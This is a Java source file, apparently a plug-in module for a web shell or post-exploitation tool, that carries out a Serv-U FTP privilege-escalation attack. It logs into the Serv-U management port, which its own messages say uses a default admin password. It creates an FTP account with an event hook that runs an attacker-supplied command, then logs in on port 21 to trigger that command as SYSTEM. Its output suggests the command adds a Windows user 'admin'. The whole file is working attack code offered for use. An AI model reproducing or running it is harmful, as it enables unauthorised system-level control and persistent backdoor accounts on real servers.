// payload.java

import java.io.*;
import java.net.Socket;
import java.util.Base64;
import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class payload {
    public payload() {}

    private String fnExtractJsonValue(String json, String key) {
        String pattern = "\"" + key + "\"\\s*:\\s*\"?([^\",}]+)\"?";
        Pattern r = Pattern.compile(pattern);
        Matcher m = r.matcher(json);
        if (m.find()) {
            return m.group(1).trim();
        }
        return "";
    }

    public String Execute(Object param) throws Exception {
        try {
            String base64Input = (param != null) ? param.toString() : "";
            String decodedJson = new String(Base64.getDecoder().decode(base64Input), StandardCharsets.UTF_8);

            String host = fnExtractJsonValue(decodedJson, "ip");
            String portStr = fnExtractJsonValue(decodedJson, "port");
            int port = portStr.isEmpty() ? 43958 : Integer.parseInt(portStr);
            String user = fnExtractJsonValue(decodedJson, "user");
            String pass = fnExtractJsonValue(decodedJson, "pass");
            String cmd = fnExtractJsonValue(decodedJson, "cmd");

            StringBuilder output = new StringBuilder();

            try (Socket socket = new Socket(host, port);
                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream(), StandardCharsets.US_ASCII));
                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(), StandardCharsets.US_ASCII))
            ) {
                socket.setSoTimeout(5000);
                
                reader.readLine();
                output.append("[+] Successfully connected to Serv-U management port...\n");

                writer.write("USER " + user + "\r\n");
                writer.flush();
                reader.readLine();

                writer.write("PASS " + pass + "\r\n");
                writer.flush();
                String response = reader.readLine();

                if (response == null || (!response.contains("230") && !response.contains("Logged in"))) {
                    return Base64.getEncoder().encodeToString(("[-] Login failed: Default administrative password has been changed.\n").getBytes(StandardCharsets.UTF_8));
                }

                output.append("[+] Successfully authenticated into Serv-U management interface!\n");

                writer.write("SUSER " + user + "|" + pass + "|Y|N\r\n");
                writer.flush();
                reader.readLine();

                writer.write("SEVENT " + user + "|0|0|" + cmd + "\r\n");
                writer.flush();
                reader.readLine();

                output.append("[+] Malicious FTP account and Event trigger configured successfully.\n");
            } catch (Exception e) {
                return Base64.getEncoder().encodeToString(("[-] Failed to connect to Serv-U management port. Reason: " + e.getMessage() + "\n").getBytes(StandardCharsets.UTF_8));
            }

            output.append("[+] Attempting to log into standard FTP port to trigger the SYSTEM payload...\n");
            try (Socket ftpSocket = new Socket("127.0.0.1", 21)) {
                ftpSocket.setSoTimeout(3000);
                BufferedReader ftpReader = new BufferedReader(new InputStreamReader(ftpSocket.getInputStream(), StandardCharsets.US_ASCII));
                BufferedWriter ftpWriter = new BufferedWriter(new OutputStreamWriter(ftpSocket.getOutputStream(), StandardCharsets.US_ASCII));
                
                ftpReader.readLine();
                ftpWriter.write("USER " + user + "\r\n");
                ftpWriter.flush();
                ftpReader.readLine();
                
                ftpWriter.write("PASS " + pass + "\r\n");
                ftpWriter.flush();
                ftpReader.readLine();
                
                ftpWriter.write("QUIT\r\n");
                ftpWriter.flush();
                
                output.append("[+] Payload triggered! Verify if the Windows user 'admin' was added.\n");
            } catch (Exception e) {
                output.append("[-] Could not connect to port 21. The event will trigger whenever the account is accessed.\n");
            }

            return Base64.getEncoder().encodeToString(output.toString().getBytes(StandardCharsets.UTF_8));

        } catch (Throwable e) {
            return Base64.getEncoder().encodeToString(("ERROR: " + e.toString()).getBytes(StandardCharsets.UTF_8));
        }
    }
}